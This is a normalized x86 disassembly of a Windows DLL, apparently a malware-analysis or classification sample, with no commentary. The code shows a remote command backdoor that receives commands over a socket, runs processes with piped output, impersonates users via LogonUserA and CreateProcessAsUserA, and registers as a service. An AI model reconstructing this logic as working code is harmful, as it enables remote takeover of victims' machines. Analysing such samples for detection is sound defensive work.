push [ rw-data ]
call closesocket
push 0x4e20
mov eax [ rw-data ]
mov [ esp + 0x108 ] eax
lea eax [ esp + 0x74 ]
push eax
push ebx
push ebx
lea eax [ esp + 0x110 ]
push eax
push ebx
mov [ esp + 0x118 ] 0x1
call select
test eax eax
je r-xdata
mov [ esp + 0x24 ] ebx
lea eax [ esp + 0x104 ]
push eax
push [ rw-data ]
call __WSAFDIsSet
test eax eax
je r-xdata
mov eax [ eax ]
push [ eax ]
call inet_ntoa
push eax
push esi
call strcat
push r--data
push esi
call strcat
add esp 0x10
add [ esp + 0x24 ] 0x4
jmp r-xdata
push [ rw-data ]
push edi
call sub_71002b20
push 0x4
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
push ebx
push 0x2000
push edi
push [ rw-data ]
call recv
cmp eax 0x1
mov [ rw-data ] eax
jl r-xdata
mov eax [ esp + 0x30 ]
mov eax [ eax + 0xc ]
mov ecx [ esp + 0x24 ]
add eax ecx
cmp [ eax ] ebx
je r-xdata
lea eax [ esp + 0x28 ]
push eax
push ebx
push ebx
push r-xdata
push ebx
push ebx
call [ CreateThread@IAT ]
jmp r-xdata
push 0x2000
push ebx
push edi
call memset
add esp 0xc
push ebx
push 0x2000
push edi
push [ rw-data ]
call recv
cmp eax 0x1
mov [ rw-data ] eax
jge r-xdata
push eax
push edi
call sub_71002b20
push 0x2000
push ebx
push esi
call memset
push 0x2000
push ebx
push ebp
call memset
push 0x4
push r--data
push edi
call memcmp
add esp 0x24
test eax eax
je r-xdata
push ebx
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
push 0xea60
jmp r-xdata
cmp [ esp + 0x40 ] 0x1
jne r-xdata
push 0x5
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
call [ Sleep@IAT ]
jmp r-xdata
push 0x1f4
call [ Sleep@IAT ]
push [ rw-data ]
call [ CloseHandle@IAT ]
push [ rw-data ]
call [ CloseHandle@IAT ]
push [ rw-data ]
call [ CloseHandle@IAT ]
push [ rw-data ]
call [ CloseHandle@IAT ]
push [ rw-data ]
call closesocket
push 0x14
lea eax [ esp + 0x3ac ]
push ebx
push eax
call memset
push edi
call strlen
sub eax 0x4
push eax
lea eax [ esp + 0x3bc ]
push rw-data
push eax
call [ strncpy@IAT ]
lea eax [ esp + 0x3c4 ]
push eax
call [ atof@IAT ]
fmul [ r--data ]
add esp 0x20
call sub_71005a36
push eax
jmp r-xdata
push r--data
call sub_710022da
push 0x4
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
cmp [ esp + 0x34 ] ebx
je r-xdata
push 0x7
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
push 0x44
lea eax [ esp + 0xc4 ]
push ebx
push eax
mov [ esp + 0x3c ] ebx
call memset
add esp 0xc
lea eax [ esp + 0xc0 ]
push eax
call [ GetStartupInfoA@IAT ]
push 0x14
mov [ esp + 0xc4 ] 0x44
mov [ esp + 0xf0 ] 0x101
mov [ esp + 0xf4 ] bx
call [ malloc@IAT ]
push 0x14
mov [ esp + 0x2c ] eax
call [ malloc@IAT ]
push 0x14
mov [ esp + 0x44 ] eax
call [ malloc@IAT ]
push 0x32
mov [ esp + 0x30 ] eax
call [ malloc@IAT ]
push 0x64
mov [ esp + 0x60 ] eax
call [ malloc@IAT ]
push 0x14
push ebx
push [ esp + 0x40 ]
mov [ esp + 0x3c ] eax
call memset
push 0x14
push ebx
push [ esp + 0x60 ]
call memset
push 0x14
push ebx
push [ esp + 0x54 ]
call memset
push 0x32
push ebx
push [ esp + 0x8c ]
call memset
add esp 0x44
push 0x64
push ebx
push [ esp + 0x24 ]
call memset
push edi
call strlen
sub eax 0x4
push eax
push rw-data
push [ esp + 0x34 ]
call [ strncpy@IAT ]
push [ esp + 0x38 ]
mov [ esp + 0x38 ] ebx
call strlen
add esp 0x20
test eax eax
jle r-xdata
push ebx
lea eax [ esp + 0x6c ]
push eax
push rw-data
push rw-data
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
push r--data
push 0x3
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
cmp [ esp + 0x34 ] ebx
jne r-xdata
mov eax [ esp + 0x18 ]
push [ esp + 0x1c ]
inc eax
mov [ esp + 0x18 ] eax
call strlen
cmp [ esp + 0x18 ] eax
pop ecx
jge r-xdata
mov ecx [ esp + 0x1c ]
mov eax [ esp + 0x24 ]
sub eax ecx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x3c ] eax
push r--data
jmp r-xdata
push ebx
lea eax [ esp + 0x6c ]
push eax
push rw-data
push rw-data
call [ CreatePipe@IAT ]
test eax eax
jne r-xdata
push 0x8
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
je r-xdata
push r--data
push esi
call strcpy
push esi
call strlen
add esp 0xc
push eax
push ebp
push esi
call sub_71003453
push eax
push ebp
push [ rw-data ]
mov [ rw-data ] eax
call sub_7100296b
cmp eax 0x1
jl r-xdata
push edi
call strlen
inc eax
inc eax
push eax
call [ malloc@IAT ]
cmp eax ebx
pop ecx
pop ecx
mov [ esp + 0x20 ] eax
je r-xdata
push r--data
jmp r-xdata
mov eax [ esp + 0x14 ]
push [ esp + 0x1c ]
inc eax
mov [ esp + 0x1c ] eax
call strlen
cmp [ esp + 0x1c ] eax
pop ecx
jge r-xdata
mov eax [ esp + 0x14 ]
sub eax [ esp + 0x18 ]
mov ecx [ esp + 0x38 ]
lea eax [ eax + ecx - 0x1 ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x3c ]
push [ esp + 0x1c ]
inc [ esp + 0x1c ]
inc [ esp + 0x18 ]
mov [ ecx + edx ] al
call strlen
cmp [ esp + 0x1c ] eax
pop ecx
jl r-xdata
push esi
call strcpy
push esi
call strlen
add esp 0xc
push eax
push ebp
push esi
call sub_71003453
push eax
push ebp
push [ rw-data ]
mov [ rw-data ] eax
call sub_7100296b
cmp eax 0x1
jge r-xdata
push 0x44
lea eax [ esp + 0x80 ]
push ebx
push eax
call memset
add esp 0xc
lea eax [ esp + 0x7c ]
push eax
call [ GetStartupInfoA@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ esp + 0xbc ] eax
mov [ esp + 0xb8 ] eax
lea eax [ esp + 0x3d0 ]
push eax
lea eax [ esp + 0x80 ]
push eax
push ebx
push ebx
push 0x10
push 0x1
push ebx
push ebx
push [ esp + 0x84 ]
mov [ esp + 0xa0 ] 0x44
push ebx
mov [ esp + 0xd0 ] 0x101
mov [ esp + 0xd4 ] bx
mov [ esp + 0xdc ] ecx
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
push [ rw-data ]
call [ CloseHandle@IAT ]
push [ rw-data ]
jmp r-xdata
lea eax [ esp + 0x28 ]
push eax
push ebx
push edi
push sub_7100367f
push 0x6
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
je r-xdata
lea eax [ esp + 0x28 ]
push eax
push ebx
push edi
push sub_710027f5
jmp r-xdata
push edi
call strlen
inc eax
inc eax
push eax
push ebx
push [ esp + 0x2c ]
call memset
push edi
call strlen
sub eax 0x8
push eax
push rw-data
push [ esp + 0x3c ]
call [ strncpy@IAT ]
add esp 0x20
cmp [ esp + 0x40 ] 0x1
jne r-xdata
mov eax [ esp + 0x18 ]
push [ esp + 0x1c ]
inc eax
mov [ esp + 0x18 ] eax
call strlen
cmp [ esp + 0x18 ] eax
pop ecx
jge r-xdata
mov eax [ esp + 0x18 ]
sub eax [ esp + 0x14 ]
mov ecx [ esp + 0x20 ]
lea eax [ eax + ecx - 0x1 ]
mov [ esp + 0x14 ] eax
mov ecx [ esp + 0x18 ]
push [ esp + 0x1c ]
inc [ esp + 0x18 ]
inc [ esp + 0x1c ]
mov [ ecx ] al
call strlen
cmp [ esp + 0x18 ] eax
pop ecx
jl r-xdata
mov eax [ esp + 0x14 ]
mov al [ eax ]
cmp al 0x2d
je r-xdata
lea eax [ esp + 0x28 ]
push eax
push ebx
push ebx
push sub_710034b1
push ebx
push ebx
call [ CreateThread@IAT ]
cmp eax ebx
mov [ esp + 0x34 ] eax
jne r-xdata
push [ rw-data ]
call [ CloseHandle@IAT ]
push [ rw-data ]
call [ CloseHandle@IAT ]
push [ rw-data ]
call [ CloseHandle@IAT ]
push [ rw-data ]
call [ CloseHandle@IAT ]
push 0xb
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
push ebx
push ebx
call [ CreateThread@IAT ]
push [ esp + 0x20 ]
call sub_710022da
test al al
jne r-xdata
push r--data
push [ esp + 0x24 ]
call strcat
pop ecx
pop ecx
push 0x4
push r--data
push [ esp + 0x28 ]
call memcmp
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esp + 0x14 ]
sub eax [ esp + 0x18 ]
mov ecx [ esp + 0x4c ]
lea eax [ eax + ecx - 0x1 ]
mov [ esp + 0x18 ] eax
mov ecx [ esp + 0x14 ]
push [ esp + 0x1c ]
inc [ esp + 0x1c ]
inc [ esp + 0x18 ]
mov [ ecx ] al
call strlen
cmp [ esp + 0x1c ] eax
pop ecx
jl r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
mov al [ ecx + eax ]
cmp al 0x2d
je r-xdata
mov [ rw-data ] 0x1
push r--data
jmp r-xdata
push 0x5
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x4
push r--data
push [ esp + 0x28 ]
call memcmp
add esp 0xc
test eax eax
jne r-xdata
push r--data
push esi
call strcpy
push esi
call strlen
add esp 0xc
push eax
push ebp
push esi
call sub_71003453
push eax
push ebp
push [ rw-data ]
mov [ rw-data ] eax
call sub_7100296b
cmp eax 0x1
jl r-xdata
push 0x4
push r--data
push [ esp + 0x40 ]
call memcmp
add esp 0xc
test eax eax
jne r-xdata
push 0x14
push ebx
push [ esp + 0x28 ]
call memset
add esp 0xc
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
mov cl [ ecx + eax ]
inc [ esp + 0x14 ]
inc [ esp + 0x18 ]
push eax
mov [ edx ] cl
call strlen
cmp [ esp + 0x18 ] eax
pop ecx
jl r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
mov al [ ecx + eax ]
cmp al 0x2d
je r-xdata
push 0x10
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push [ esp + 0x20 ]
call [ free@IAT ]
pop ecx
jmp r-xdata
push ebx
push [ esp + 0x38 ]
mov [ rw-data ] bl
call [ TerminateThread@IAT ]
push r--data
push esi
mov [ esp + 0x3c ] ebx
call strcpy
push esi
call strlen
add esp 0xc
push eax
push ebp
push esi
call sub_71003453
push eax
push ebp
push [ rw-data ]
mov [ rw-data ] eax
call sub_7100296b
cmp eax 0x1
jl r-xdata
lea eax [ esp + 0x30 ]
push eax
push ebx
push 0x2
push [ esp + 0x44 ]
push [ esp + 0x30 ]
push [ esp + 0x38 ]
call [ LogonUserA@IAT ]
push [ esp + 0x24 ]
mov [ esp + 0x40 ] eax
call [ free@IAT ]
push [ esp + 0x3c ]
call [ free@IAT ]
push [ esp + 0x28 ]
call [ free@IAT ]
push [ esp + 0x28 ]
call [ free@IAT ]
add esp 0x10
cmp [ esp + 0x3c ] ebx
jne r-xdata
push 0x14
push ebx
push [ esp + 0x40 ]
call memset
add esp 0xc
push 0x17
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
push 0x14
lea eax [ esp + 0x3ac ]
push ebx
push eax
call memset
push edi
call strlen
sub eax 0x16
push eax
lea eax [ esp + 0x3bc ]
push rw-data
push eax
call memcpy
lea eax [ esp + 0x3c4 ]
push eax
call [ _atoi64@IAT ]
add esp 0x20
mov [ rw-data ] eax
mov [ rw-data ] edx
lea eax [ esp + 0x3bc ]
push eax
lea eax [ esp + 0xc4 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push [ esp + 0x6c ]
push ebx
push [ esp + 0x58 ]
call [ CreateProcessAsUserA@IAT ]
test eax eax
jne r-xdata
push r--data
jmp r-xdata
push 0x14
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
push r--data
jmp r-xdata
push 0x6
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
push 0x14
lea eax [ esp + 0x3ac ]
push ebx
push eax
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call memset
push edi
call strlen
sub eax 0x1a
push eax
lea eax [ esp + 0x3bc ]
push rw-data
push eax
call memcpy
lea eax [ esp + 0x3c4 ]
push eax
call [ _atoi64@IAT ]
add esp 0x20
mov [ rw-data ] eax
mov [ rw-data ] edx
push 0x5
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
push 0x2
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x28 ]
push eax
push ebx
push edi
push sub_710042a7
jmp r-xdata
push 0x2
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x28 ]
push eax
push ebx
push edi
push sub_71003d27
jmp r-xdata
push 0x6
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x28 ]
push eax
push ebx
push edi
push sub_71003f42
jmp r-xdata
push 0x3
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
call sub_7100109e
push eax
jmp r-xdata
push 0x3
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esp + 0x50 ]
call sub_71001568
lea ecx [ esp + 0x50 ]
mov [ esp + 0x2670 ] ebx
call sub_710015dd
push 0x2000
push ebx
push esi
call memset
add esp 0xc
lea ecx [ esp + 0x50 ]
call sub_7100193e
push eax
push esi
call strcpy
push esi
call strlen
add esp 0xc
push eax
push ebp
push esi
call sub_71003453
push 0x2000
mov [ rw-data ] eax
lea eax [ esp + 0x668 ]
push ebx
push eax
call memset
push [ rw-data ]
lea eax [ esp + 0x674 ]
push ebp
push eax
call memcpy
mov eax [ rw-data ]
push 0x2000
push ebx
push esi
mov [ esp + 0x60 ] eax
call memset
push [ rw-data ]
push r--data
push esi
call [ sprintf@IAT ]
push esi
call strlen
add esp 0x34
push eax
push ebp
push esi
call sub_71003453
push ebx
push eax
push ebp
push [ rw-data ]
mov [ rw-data ] eax
call send
cmp eax 0x1
jl r-xdata
push 0x6
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
push 0x200
lea eax [ esp + 0x468 ]
push ebx
push eax
call memset
push edi
call strlen
sub eax 0x4
push eax
lea eax [ esp + 0x478 ]
push rw-data
push eax
call memcpy
add esp 0x1c
cmp [ esp + 0x40 ] 0x1
jne r-xdata
push ebx
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
push 0x4e20
call [ Sleep@IAT ]
lea ecx [ esp + 0x50 ]
jmp r-xdata
push 0x2000
push ebx
push edi
call memset
add esp 0xc
push ebx
push 0x2000
push edi
push [ rw-data ]
call recv
cmp eax 0x1
mov [ rw-data ] eax
jge r-xdata
push 0x5
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
cmp [ esp + 0x44 ] ebx
mov [ esp + 0x30 ] ebx
je r-xdata
lea ecx [ esp + 0x5c ]
call sub_71001568
lea ecx [ esp + 0x5c ]
mov [ esp + 0x2670 ] 0x1
call sub_710015dd
lea eax [ esp + 0x464 ]
push eax
call [ atoi@IAT ]
cmp eax ebx
pop ecx
lea ecx [ esp + 0x5c ]
jne r-xdata
or [ esp + 0x2670 ] 0xffffffff
call sub_71001572
jmp r-xdata
push eax
push edi
call sub_71002b20
push 0x5
push r--data
push edi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
push ebx
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
push 0x4e20
call [ Sleep@IAT ]
cmp [ esp + 0x48 ] ebx
mov [ esp + 0x58 ] ebx
je r-xdata
lea eax [ esp + 0x28 ]
push eax
push ebx
push edi
push sub_71002b8c
push ebx
push ebx
call [ CreateThread@IAT ]
mov [ esp + 0x44 ] eax
jmp r-xdata
lea eax [ esp + 0x30 ]
push eax
push [ esp + 0x48 ]
call [ GetExitCodeThread@IAT ]
test eax eax
je r-xdata
push eax
call sub_71001790
lea eax [ esp + 0x464 ]
push eax
call sub_71001869
jmp r-xdata
lea ecx [ esp + 0x50 ]
jmp r-xdata
push [ esp + 0x3c ]
lea eax [ esp + 0x668 ]
push eax
push [ rw-data ]
call sub_7100296b
cmp eax 0x1
jge r-xdata
or [ esp + 0x2670 ] 0xffffffff
call sub_71001572
jmp r-xdata
lea eax [ esp + 0x28 ]
push eax
push ebx
push edi
push sub_71002c7a
push ebx
push ebx
call [ CreateThread@IAT ]
mov [ esp + 0x48 ] eax
jmp r-xdata
lea eax [ esp + 0x58 ]
push eax
push [ esp + 0x4c ]
call [ GetExitCodeThread@IAT ]
test eax eax
je r-xdata
push 0x64
call [ Sleep@IAT ]
push r--data
jmp r-xdata
cmp [ esp + 0x30 ] 0x103
je r-xdata
push esi
call strlen
pop ecx
push eax
push ebp
push esi
call sub_71003453
push eax
push ebp
push [ rw-data ]
mov [ rw-data ] eax
call sub_7100296b
cmp eax 0x1
jl r-xdata
mov [ esp + 0x34 ] ebx
push eax
push esi
call strcat
pop ecx
pop ecx
push 0x13
push r--data
push esi
call memcmp
add esp 0xc
test eax eax
jne r-xdata
push r--data
jmp r-xdata
cmp [ esp + 0x58 ] 0x103
je r-xdata
push [ esp + 0x44 ]
call [ CloseHandle@IAT ]
push ebx
push [ rw-data ]
call shutdown
push [ rw-data ]
call closesocket
push 0x4e20
call [ Sleep@IAT ]
lea ecx [ esp + 0x5c ]
lea ecx [ esp + 0x5c ]
push [ esp + 0x48 ]
call [ CloseHandle@IAT ]
ServiceMain
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ strncpy@IAT ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi 0x100
push edi
push [ esi ]
lea eax [ ebp - 0x104 ]
push eax
call ebx
push edi
push [ esi ]
mov edi [ wcstombs@IAT ]
lea eax [ ebp - 0x104 ]
push eax
call edi
add esp 0x18
push sub_71001fab
lea eax [ ebp - 0x104 ]
push eax
call [ RegisterServiceCtrlHandlerA@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_71005920
leave
retn 0x8
call [ FreeConsole@IAT ]
push 0x1
push 0x0
push 0x2
call sub_71001f61
push 0x0
push 0x0
push 0x4
call sub_71001f61
xor eax eax
cmp [ ebp + 0x8 ] 0x2
setg al
cmp [ ebp + 0x8 ] 0x1
mov [ ebp - 0x20c ] eax
jle r-xdata
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
call sub_71001de9
test eax eax
jne r-xdata
push 0x104
push [ esi + 0x4 ]
lea eax [ ebp - 0x208 ]
push eax
call ebx
push 0x104
push [ esi + 0x4 ]
lea eax [ ebp - 0x208 ]
push eax
call edi
add esp 0x18
jmp r-xdata
call sub_710045eb
push 0x104
lea eax [ ebp - 0x208 ]
push r--data
push eax
call ebx
add esp 0xc
cmp eax 0x1
jne r-xdata
push 0xa
call [ Sleep@IAT ]
mov eax [ rw-data ]
cmp eax 0x3
je r-xdata
sub_7100593c
push sub_71005995
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_710059c0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_71005a1c
cmp [ rw-data ] 0x0
je sub_71005a36
sub esp 0x4
fnstcw [ esp ]
pop eax
and ax 0x7f
cmp ax 0x7f
je r-xdata
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
sub_71005a36
push ebp
mov ebp esp
sub esp 0x20
and esp 0xfffffff0
fld st0
fst [ esp + 0x18 ]
fistp [ esp + 0x10 ]
fild [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
test edx 0x7fffffff
jne r-xdata
fsubp st1
test edx edx
jns r-xdata
fstp [ esp + 0x18 ]
fstp [ esp + 0x18 ]
fstp [ esp ]
mov ecx [ esp ]
add ecx 0x7fffffff
sbb eax 0x0
mov edx [ esp + 0x14 ]
sbb edx 0x0
jmp r-xdata
fstp [ esp ]
mov ecx [ esp ]
xor ecx 0x80000000
add ecx 0x7fffffff
adc eax 0x0
mov edx [ esp + 0x14 ]
adc edx 0x0
jmp r-xdata
leave
retn
sub_71005ab8
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_71005af4
push ebx
mov bl [ esp + 0x8 ]
test bl 0x2
push esi
mov esi ecx
je r-xdata
call ?_type_info_dtor_internal_method@type_info@@QAEXXZ
test bl 0x1
je r-xdata
push edi
push ?_type_info_dtor_internal_method@type_info@@QAEXXZ
lea edi [ esi - 0x4 ]
push [ edi ]
push 0xc
push esi
call sub_71006099
test bl 0x1
je r-xdata
mov eax esi
push esi
call ??3@YAXPAX@Z
pop ecx
mov eax edi
pop edi
jmp r-xdata
push edi
call operator delete
pop ecx
pop esi
pop ebx
retn 0x4
sub_71005b50
push esi
push 0x80
call [ _malloc_crt@IAT ]
mov esi eax
push esi
call [ _encode_pointer@IAT ]
test esi esi
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] eax
jne r-xdata
and [ esi ] 0x0
call sub_710061b9
push sub_710061dd
call sub_710061a7
mov [ esp ] sub_710060fc
call sub_710061a7
pop ecx
xor eax eax
pop esi
retn
xor eax eax
inc eax
pop esi
retn
sub_71005b9d
mov eax [ esp + 0x8 ]
push ebp
xor ebp ebp
cmp eax ebp
jne r-xdata
cmp eax 0x1
mov ecx [ _adjust_fdiv@IAT ]
mov ecx [ ecx ]
push ebx
push esi
push edi
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] ebp
jle r-xdata
cmp eax ebp
jne r-xdata
mov eax [ fs : 0x18 ]
mov edi [ eax + 0x4 ]
mov ebx [ InterlockedCompareExchange@IAT ]
push ebp
mov esi rw-data
jmp r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
xor eax eax
inc eax
mov edi [ InterlockedCompareExchange@IAT ]
mov esi rw-data
jmp r-xdata
push edi
push esi
call ebx
test eax eax
jne r-xdata
pop ebp
retn 0xc
push ebp
push 0x1
push esi
call edi
test eax eax
jne r-xdata
cmp eax edi
je r-xdata
jmp r-xdata
push 0x3e8
call [ Sleep@IAT ]
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
xor ebp ebp
inc ebp
push 0x3e8
call [ Sleep@IAT ]
push 0x0
mov eax [ rw-data ]
test eax eax
push 0x2
pop edi
je r-xdata
push [ rw-data ]
mov edi [ _decode_pointer@IAT ]
call edi
mov ebx eax
test ebx ebx
pop ecx
je r-xdata
push 0x1f
call _amsg_exit
pop ecx
jmp r-xdata
push r--data
push r--data
mov [ rw-data ] 0x1
call _initterm_e
test eax eax
pop ecx
pop ecx
je r-xdata
push 0x1f
call _amsg_exit
jmp r-xdata
push 0x0
push esi
mov [ rw-data ] ebp
call [ InterlockedExchange@IAT ]
push [ rw-data ]
call edi
pop ecx
mov edi eax
jmp r-xdata
push r--data
push r--data
call _initterm
pop ecx
mov [ rw-data ] edi
xor eax eax
jmp r-xdata
test ebp ebp
pop ecx
jne r-xdata
sub edi 0x4
cmp edi ebx
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push ebp
push esi
call [ InterlockedExchange@IAT ]
pop edi
pop esi
pop ebx
mov eax [ edi ]
test eax eax
je r-xdata
push ebx
call [ free@IAT ]
pop ecx
call [ _encoded_null@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
inc [ rw-data ]
jmp r-xdata
push rw-data
call sub_71006282
test eax eax
pop ecx
je r-xdata
call eax
push [ esp + 0x1c ]
push edi
push [ esp + 0x1c ]
call [ rw-data ]
sub_71005d3c
push 0x10
push r--data
call sub_7100593c
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ rw-data ] esi
mov [ ebp - 0x4 ] eax
cmp esi ecx
jne r-xdata
cmp esi eax
je r-xdata
cmp [ rw-data ] ecx
jne r-xdata
mov eax [ r--data ]
cmp eax ecx
je r-xdata
cmp esi 0x2
jne r-xdata
mov [ ebp - 0x1c ] ecx
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_71001dd3
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_71005e47
mov eax [ ebp - 0x1c ]
call sub_71005981
retn
push edi
push esi
push ebx
call sub_71005b9d
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_71005b9d
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_71001dd3
push edi
push 0x0
push ebx
call sub_71005b9d
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
sub_71005e73
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call _crt_debugger_hook
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call _crt_debugger_hook
pop ecx
sub_71005fce
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_71005f7e
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_7100603b
push 0x14
push r--data
call sub_7100593c
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_71005981
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_7100605e
mov eax [ ebp - 0x14 ]
